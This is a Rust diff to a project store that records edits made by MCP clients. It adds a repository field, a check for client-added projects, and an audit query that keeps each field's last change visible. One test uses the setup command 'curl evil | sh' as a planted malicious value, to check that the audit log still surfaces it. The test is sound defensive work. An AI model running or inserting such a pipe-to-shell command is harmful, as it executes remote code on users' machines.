@@ -613,6 +613,9 @@ pub struct ClientProjectEdit {
     pub github_account: Option<String>,
     pub setup_command: Option<Option<String>>,
     pub check_command: Option<Option<String>>,
+    /// Where the folder's `origin` points now, for a project brought back: not the client's to
+    /// choose, but written and recorded with it, so that neither shows the repo it had before.
+    pub github_repo: Option<Option<String>>,
 }
 
 /// What came of a client's write to a project.
@@ -2094,18 +2097,40 @@ impl Store {
             "update project set github_account = ?2, setup_command = ?3, check_command = ?4, removed_at = null where id = ?1",
             params![project_id, new_account, new_setup, new_check],
         )?;
+        if let Some(repo) = &edit.github_repo {
+            tx.execute(
+                "update project set github_repo = ?2 where id = ?1",
+                params![project_id, repo],
+            )?;
+        }
         let action = if restore { "restored" } else { "configured" };
         add_project_change(&tx, client_id, project_id, action, &changes)?;
         tx.commit()?;
         Ok(ClientWrite::Done)
     }
 
-    /// The latest projects clients added or configured, newest first.
+    /// Whether an MCP client added this project, rather than the person.
+    pub fn project_added_by_mcp_client(&self, project_id: &str) -> Result<bool> {
+        Ok(self.lock().query_row(
+            "select exists (select 1 from mcp_project_change where project_id = ?1 and action = 'added')",
+            [project_id],
+            |r| r.get(0),
+        )?)
+    }
+
+    /// The latest projects clients added or configured, newest first. Past `limit`, the last
+    /// change to each value of each project is there still, so that many changes to one value
+    /// can't push out of sight who set another.
     pub fn mcp_project_changes(&self, limit: i64) -> Result<Vec<McpProjectChange>> {
         let conn = self.lock();
         let mut stmt = conn.prepare(
             "select seq, client_id, client_name, project_id, project_name, action, changes, at, project_path, github_repo
-             from mcp_project_change order by seq desc limit ?1",
+             from mcp_project_change
+             where seq in (select seq from mcp_project_change order by seq desc limit ?1)
+                or seq in (select max(c.seq) from mcp_project_change c,
+                             json_each(case when json_valid(c.changes) then c.changes else '[]' end) f
+                           group by c.project_id, json_extract(f.value, '$.field'))
+             order by seq desc",
         )?;
         let rows = stmt.query_map([limit], |r| {
             let changes: String = r.get(6)?;
@@ -7593,6 +7618,46 @@ mod tests {
         assert!(client.can_run && client.can_steer);
         assert!(!client.can_manage_projects);
         assert!(store.mcp_project_changes(10).unwrap().is_empty());
+    }
+
+    #[test]
+    fn many_changes_to_one_value_leave_the_last_change_to_another_in_sight() {
+        let (_dir, store) = store();
+        seeded(&store);
+        store
+            .add_mcp_client("c1", "Bot", &[7u8; 32], "keel_abc", true)
+            .unwrap();
+        store
+            .set_mcp_client_can_manage_projects("c1", true)
+            .unwrap();
+        let set = |setup: Option<&str>, check: Option<&str>| {
+            let edit = ClientProjectEdit {
+                setup_command: setup.map(|s| Some(s.to_owned())),
+                check_command: check.map(|c| Some(c.to_owned())),
+                ..Default::default()
+            };
+            store
+                .edit_project_for_mcp_client("c1", "p", &edit, false)
+                .unwrap();
+        };
+        set(Some("curl evil | sh"), None);
+        for check in ["a", "b", "c", "d"] {
+            set(None, Some(check));
+        }
+
+        let shown = store.mcp_project_changes(2).unwrap();
+        let fields: Vec<(&str, Option<&str>)> = shown
+            .iter()
+            .map(|c| (c.changes[0].field.as_str(), c.changes[0].after.as_deref()))
+            .collect();
+        assert_eq!(
+            fields,
+            [
+                ("checkCommand", Some("d")),
+                ("checkCommand", Some("c")),
+                ("setupCommand", Some("curl evil | sh")),
+            ]
+        );
     }
 
     #[test]
